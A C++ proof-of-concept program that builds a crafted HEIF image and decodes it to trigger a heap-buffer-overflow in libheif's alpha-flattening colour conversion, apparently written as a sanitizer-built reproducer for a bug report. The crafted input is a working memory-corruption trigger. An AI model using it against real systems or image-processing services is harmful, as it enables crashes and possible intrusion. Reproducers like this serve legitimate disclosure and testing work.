// PoC for a heap-buffer-overflow introduced in Op_flatten_alpha_plane::convert_colorspace
// (libheif/color-conversion/alpha.cc) while fixing the CWE-476 null-pointer write there.
//
// This program is self-contained: it hand-builds a minimal ISOBMFF/HEIF file with a
// single 'unci' (uncompressed, ISO/IEC 23001-17) image item -- a planar 4:4:4 RGBA
// image, 8 bits per component, with a highly non-square size (narrow and tall) -- and
// then decodes it through the public libheif API while requesting alpha compositing
// onto a solid background and an RGB (no-alpha) target. That routes the decode through
// Op_flatten_alpha_plane, which allocates its output R/G/B planes and then composites
// the colour and alpha planes into them.
//
// Build: link against a libheif built with -DWITH_UNCOMPRESSED_CODEC=ON and
// -fsanitize=address.

#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <vector>

#include "libheif/heif.h"

namespace {

void put_u32_be(std::vector<uint8_t>& out, uint32_t v)
{
  out.push_back(static_cast<uint8_t>(v >> 24));
  out.push_back(static_cast<uint8_t>(v >> 16));
  out.push_back(static_cast<uint8_t>(v >> 8));
  out.push_back(static_cast<uint8_t>(v));
}

void put_u16_be(std::vector<uint8_t>& out, uint16_t v)
{
  out.push_back(static_cast<uint8_t>(v >> 8));
  out.push_back(static_cast<uint8_t>(v));
}

void append_fourcc(std::vector<uint8_t>& out, const char fourcc[4])
{
  for (int i = 0; i < 4; i++) {
    out.push_back(static_cast<uint8_t>(fourcc[i]));
  }
}

void append_cstr(std::vector<uint8_t>& out, const char* s)
{
  while (*s) {
    out.push_back(static_cast<uint8_t>(*s));
    ++s;
  }
  out.push_back(0);
}

void append(std::vector<uint8_t>& out, const std::vector<uint8_t>& v)
{
  out.insert(out.end(), v.begin(), v.end());
}

std::vector<uint8_t> make_box(const char fourcc[4],
                               const std::vector<uint8_t>& payload,
                               bool is_full_box = false,
                               uint8_t version = 0,
                               uint32_t flags = 0)
{
  const size_t header_size = is_full_box ? 12 : 8;

  std::vector<uint8_t> box;
  box.reserve(header_size + payload.size());

  put_u32_be(box, static_cast<uint32_t>(header_size + payload.size()));
  append_fourcc(box, fourcc);
  if (is_full_box) {
    box.push_back(version);
    box.push_back(static_cast<uint8_t>(flags >> 16));
    box.push_back(static_cast<uint8_t>(flags >> 8));
    box.push_back(static_cast<uint8_t>(flags));
  }
  append(box, payload);
  return box;
}

// Narrow and tall on purpose: the composite output planes are large enough (and
// asymmetric enough) that a width/height mix-up during plane allocation overflows
// the allocated buffer instead of just landing in alignment padding.
constexpr uint32_t WIDTH = 8;
constexpr uint32_t HEIGHT = 512;

std::vector<uint8_t> build_heif_unci_rgba_8bit_tall()
{
  std::vector<uint8_t> ftyp_payload;
  append_fourcc(ftyp_payload, "mif1");
  put_u32_be(ftyp_payload, 0);
  append_fourcc(ftyp_payload, "mif1");
  append_fourcc(ftyp_payload, "heic");
  auto ftyp = make_box("ftyp", ftyp_payload);

  std::vector<uint8_t> hdlr_payload;
  put_u32_be(hdlr_payload, 0);
  append_fourcc(hdlr_payload, "pict");
  put_u32_be(hdlr_payload, 0);
  put_u32_be(hdlr_payload, 0);
  put_u32_be(hdlr_payload, 0);
  hdlr_payload.push_back(0);
  auto hdlr = make_box("hdlr", hdlr_payload, /*full=*/true);

  std::vector<uint8_t> pitm_payload;
  put_u16_be(pitm_payload, 1);
  auto pitm = make_box("pitm", pitm_payload, /*full=*/true);

  std::vector<uint8_t> infe_payload;
  put_u16_be(infe_payload, 1);
  put_u16_be(infe_payload, 0);
  append_fourcc(infe_payload, "unci");
  append_cstr(infe_payload, "");
  auto infe = make_box("infe", infe_payload, /*full=*/true, /*version=*/2);

  std::vector<uint8_t> iinf_payload;
  put_u16_be(iinf_payload, 1);
  append(iinf_payload, infe);
  auto iinf = make_box("iinf", iinf_payload, /*full=*/true);

  std::vector<uint8_t> ispe_payload;
  put_u32_be(ispe_payload, WIDTH);
  put_u32_be(ispe_payload, HEIGHT);
  auto ispe = make_box("ispe", ispe_payload, /*full=*/true);

  // cmpd: R, G, B, Alpha (component types 4, 5, 6, 7).
  std::vector<uint8_t> cmpd_payload;
  put_u32_be(cmpd_payload, 4);
  put_u16_be(cmpd_payload, 4); // red
  put_u16_be(cmpd_payload, 5); // green
  put_u16_be(cmpd_payload, 6); // blue
  put_u16_be(cmpd_payload, 7); // alpha
  auto cmpd = make_box("cmpd", cmpd_payload);

  // uncC (v0): component (planar) interleave, 4:4:4, all components 8 bit.
  std::vector<uint8_t> uncC_payload;
  put_u32_be(uncC_payload, 0); // profile
  put_u32_be(uncC_payload, 4); // component_count
  for (uint16_t idx = 0; idx < 4; idx++) {
    put_u16_be(uncC_payload, idx); // component_index
    uncC_payload.push_back(7);     // component_bit_depth_minus_one (8 bit)
    uncC_payload.push_back(0);     // component_format (unsigned)
    uncC_payload.push_back(0);     // component_align_size
  }
  uncC_payload.push_back(0);   // sampling_type = 4:4:4
  uncC_payload.push_back(0);   // interleave_type = component (planar)
  uncC_payload.push_back(0);   // block_size
  uncC_payload.push_back(0);   // flags
  put_u32_be(uncC_payload, 0); // pixel_size
  put_u32_be(uncC_payload, 0); // row_align_size
  put_u32_be(uncC_payload, 0); // tile_align_size
  put_u32_be(uncC_payload, 0); // num_tile_cols_minus_one
  put_u32_be(uncC_payload, 0); // num_tile_rows_minus_one
  auto uncC = make_box("uncC", uncC_payload, /*full=*/true);

  std::vector<uint8_t> ipco_payload;
  append(ipco_payload, ispe);
  append(ipco_payload, cmpd);
  append(ipco_payload, uncC);
  auto ipco = make_box("ipco", ipco_payload);

  std::vector<uint8_t> ipma_payload;
  put_u32_be(ipma_payload, 1);
  put_u16_be(ipma_payload, 1);
  ipma_payload.push_back(3);
  ipma_payload.push_back(0x80 | 1);
  ipma_payload.push_back(0x80 | 2);
  ipma_payload.push_back(0x80 | 3);
  auto ipma = make_box("ipma", ipma_payload, /*full=*/true);

  std::vector<uint8_t> iprp_payload;
  append(iprp_payload, ipco);
  append(iprp_payload, ipma);
  auto iprp = make_box("iprp", iprp_payload);

  // Tile data (planar): R plane, then G, then B, then Alpha -- one byte per sample.
  std::vector<uint8_t> tile_data;
  tile_data.reserve(static_cast<size_t>(WIDTH) * HEIGHT * 4);

  for (uint32_t y = 0; y < HEIGHT; y++)
    for (uint32_t x = 0; x < WIDTH; x++)
      tile_data.push_back(static_cast<uint8_t>(0x10 + x + y));  // R

  for (uint32_t y = 0; y < HEIGHT; y++)
    for (uint32_t x = 0; x < WIDTH; x++)
      tile_data.push_back(static_cast<uint8_t>(0x20 + x + y));  // G

  for (uint32_t y = 0; y < HEIGHT; y++)
    for (uint32_t x = 0; x < WIDTH; x++)
      tile_data.push_back(static_cast<uint8_t>(0x30 + x + y));  // B

  for (uint32_t y = 0; y < HEIGHT; y++)
    for (uint32_t x = 0; x < WIDTH; x++)
      tile_data.push_back(0xE0);  // Alpha, mostly opaque

  auto idat = make_box("idat", tile_data);

  std::vector<uint8_t> iloc_payload;
  put_u16_be(iloc_payload, (4 << 12) | (4 << 8) | (0 << 4) | 0);
  put_u16_be(iloc_payload, 1);
  put_u16_be(iloc_payload, 1);
  put_u16_be(iloc_payload, 0x0001);
  put_u16_be(iloc_payload, 0);
  put_u16_be(iloc_payload, 1);
  put_u32_be(iloc_payload, 0);
  put_u32_be(iloc_payload, static_cast<uint32_t>(tile_data.size()));
  auto iloc = make_box("iloc", iloc_payload, /*full=*/true, /*version=*/1);

  std::vector<uint8_t> meta_payload;
  append(meta_payload, hdlr);
  append(meta_payload, pitm);
  append(meta_payload, iinf);
  append(meta_payload, iprp);
  append(meta_payload, iloc);
  append(meta_payload, idat);
  auto meta = make_box("meta", meta_payload, /*full=*/true);

  std::vector<uint8_t> file;
  append(file, ftyp);
  append(file, meta);
  return file;
}

}  // namespace

int main()
{
  std::vector<uint8_t> file = build_heif_unci_rgba_8bit_tall();

  heif_context* ctx = heif_context_alloc();
  if (!ctx) {
    std::fprintf(stderr, "heif_context_alloc failed\n");
    return 1;
  }

  heif_error err = heif_context_read_from_memory_without_copy(ctx, file.data(), file.size(), nullptr);
  if (err.code != heif_error_Ok) {
    std::fprintf(stderr, "read_from_memory failed: %s\n", err.message);
    return 1;
  }

  heif_image_handle* handle = nullptr;
  err = heif_context_get_primary_image_handle(ctx, &handle);
  if (err.code != heif_error_Ok || !handle) {
    std::fprintf(stderr, "get_primary_image_handle failed: %s\n", err.message);
    return 1;
  }

  heif_decoding_options* options = heif_decoding_options_alloc();
  heif_color_conversion_options_ext* ext = heif_color_conversion_options_ext_alloc();
  ext->alpha_composition_mode = heif_alpha_composition_mode_solid_color;
  ext->background_red = 0x8080;
  ext->background_green = 0x8080;
  ext->background_blue = 0x8080;
  options->color_conversion_options_ext = ext;

  heif_image* img = nullptr;
  // Decode with alpha composited onto a solid background, target colourspace is
  // plain RGB without alpha -- this selects Op_flatten_alpha_plane.
  err = heif_decode_image(handle, &img, heif_colorspace_RGB, heif_chroma_444, options);

  if (err.code != heif_error_Ok) {
    std::fprintf(stderr, "decode failed: %d/%d %s\n", err.code, err.subcode, err.message);
  }
  else {
    std::printf("decode succeeded unexpectedly (bug not triggered)\n");
    heif_image_release(img);
  }

  heif_color_conversion_options_ext_free(ext);
  heif_decoding_options_free(options);
  heif_image_handle_release(handle);
  heif_context_free(ctx);

  return 0;
}
